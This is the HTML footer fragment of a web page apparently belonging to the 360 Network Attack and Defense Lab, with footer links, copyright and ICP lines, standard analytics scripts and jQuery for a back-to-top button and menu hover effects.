            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
